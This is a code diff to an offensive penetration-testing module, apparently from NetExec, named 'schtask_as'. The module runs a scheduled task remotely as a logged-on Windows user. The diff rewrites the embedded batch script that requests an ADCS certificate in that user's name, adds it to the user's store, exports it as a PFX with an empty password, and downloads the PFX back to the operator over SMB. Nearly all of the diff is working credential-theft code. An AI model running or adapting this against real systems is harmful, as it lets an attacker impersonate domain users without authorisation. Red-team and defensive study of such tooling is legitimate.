@@ -18,6 +18,7 @@ class NXCModule:
     Modified by @Defte_ so that we can upload a custom binary to execute using the BINARY option (28/04/2025)
     Modified by @SGMG11 to execute the task without output
     Modified by @Defte_ to add certificate request on behalf of someone options
+    Modified by @Azoxlpf to improve ADCS certificate handling and PFX retrieval (17/10/2025)
     """
     name = "schtask_as"
     description = "Remotely execute a scheduled task as a logged on user"
@@ -90,32 +91,36 @@ class NXCModule:
 
             tmp_share = self.share.replace("$", ":")
             full_path_prefixed_file = f"{tmp_share}\\{self.output_file_location}\\{self.output_filename}"
-            batch_file = BytesIO(dedent(f"""
+            batch_file = BytesIO(dedent(rf"""
             @echo off
             setlocal enabledelayedexpansion
 
-            certreq -new {full_path_prefixed_file}.inf {full_path_prefixed_file}.req > nul
-            certreq -submit -config {self.ca_name} {full_path_prefixed_file}.req {full_path_prefixed_file}.cer > nul
-
+            set "BASE={full_path_prefixed_file}"
+            certreq -new "%BASE%.inf" "%BASE%.req" > nul
+            certreq -submit -config "{self.ca_name}" "%BASE%.req" "%BASE%.cer" > nul
+            certutil -user -addstore my "%BASE%.cer" > nul
             set "HASH="
-
-            for /f "usebackq tokens=* delims=" %%L in (`certreq -accept {full_path_prefixed_file}.cer`) do (
-                set "line=%%L"
-
-                for /f "tokens=2* delims=:" %%X in ("!line!") do (
-                    set "candidate=%%X"
-                    set "candidate=!candidate:~1!"
-                    echo !candidate! | findstr /R "^[0-9A-Fa-f][0-9A-Fa-f]*" > nul
-                    if not errorlevel 1 (
-                        if "!candidate:~40!"=="" (
-                            set "HASH=!candidate!"
-                            certutil -user -exportPFX -p "" !HASH! {full_path_prefixed_file}.pfx > nul
-                        )
-                    )
-                )
+            for /f "tokens=2 delims=:" %%A in ('
+                certutil -user -store my ^| findstr /r /c:"Hach\. cert\." /c:"Cert Hash"
+            ') do (
+                set "tmp=%%A"
+                set "tmp=!tmp: =!"
+                set "HASH=!tmp!"
             )
-            exit
+
+            if "!HASH!"=="" (
+                exit /b 1
+            )
+            certutil -user -repairstore my !HASH! > nul 2>&1
+            certutil -user -exportPFX -p "" -f my !HASH! "%BASE%.pfx" NoChain,NoRoot > nul 2>&1
+
+            if exist "%BASE%.pfx" (
+                exit /b 0
+            ) else (
+                exit /b 2
+            )
             """).encode())
+
             connection.conn.putFile(self.share, f"{self.output_file_location}\\{self.output_filename}.bat", batch_file.read)
             self.logger.success("Upload batch file successfully")
 
@@ -222,14 +227,39 @@ class NXCModule:
                 if not path.isdir(dump_path):
                     makedirs(dump_path)
 
-                # This sleep is required as the computing of the pfx file takes some time
-                sleep(2)
-                with open(path.join(dump_path, f"{self.run_task_as}.pfx"), "wb+") as dump_file:
+                # Polling loop to wait for the PFX to be ready (avoid fixed sleep)
+                max_wait_seconds = getattr(connection.args, "get_output_tries", None)
+                try:
+                    # connection.args.get_output_tries may be an int or str; normalize
+                    max_wait_seconds = 120 if max_wait_seconds is None else int(max_wait_seconds)
+                except Exception:
+                    max_wait_seconds = 120
+
+                pfx_local_path = path.join(dump_path, f"{self.run_task_as}.pfx")
+                pfx_remote_path = f"{self.output_file_location}\\{self.output_filename}.pfx"
+
+                self.logger.debug(f"Waiting up to {max_wait_seconds}s for remote PFX: {pfx_remote_path}")
+
+                pfx_fetched = False
+                last_exception = None
+                for second in range(max_wait_seconds):
                     try:
-                        connection.conn.getFile(self.share, f"{self.output_file_location}\\{self.output_filename}.pfx", dump_file.write)
+                        # try to download; open local file only on success
+                        with open(pfx_local_path, "wb+") as dump_file:
+                            connection.conn.getFile(self.share, pfx_remote_path, dump_file.write)
+                        pfx_fetched = True
                         self.logger.success(f"PFX file stored in {dump_path}/{self.run_task_as}.pfx")
+                        break
                     except Exception as e:
-                        self.logger.fail(f"Error while getting {self.output_file_location}\\{self.output_filename}.pfx: {e}")
+                        last_exception = e
+                        # not ready yet (or other transient error) — sleep and retry
+                        if second % 5 == 0:
+                            # log every 5s to avoid spamming
+                            self.logger.debug(f"PFX not available yet (attempt {second + 1}/{max_wait_seconds}): {e}")
+                        sleep(1)
+
+                if not pfx_fetched:
+                    self.logger.fail(f"Timed out after {max_wait_seconds}s waiting for {pfx_remote_path}. Last error: {last_exception}")
 
                 for ext in [".bat", ".inf", ".cer", ".req", ".rsp", ".pfx", ""]:
                     try:
